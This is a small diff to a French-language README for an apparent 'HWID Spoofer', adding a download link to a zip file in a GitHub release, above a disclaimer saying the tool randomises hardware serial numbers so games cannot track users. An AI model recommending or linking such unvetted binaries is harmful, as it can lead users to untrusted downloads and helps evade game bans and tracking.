@@ -1,4 +1,4 @@
-* [Download]()
+* [Download](https://github.com/IRemember7/HWID_Spoofer/releases/download/Download/HWID.zip)
 
 ## Clause de non-responsabilité:
 Un spoofer est un logiciel qui modifie (randomise) les numéros de série et les adresses physiques, attribués physiquement à votre matériel. De cette façon, les jeux et autres logiciels qui lisent les numéros de série de votre matériel ne pourront pas vous suivre lors des redémarrages.
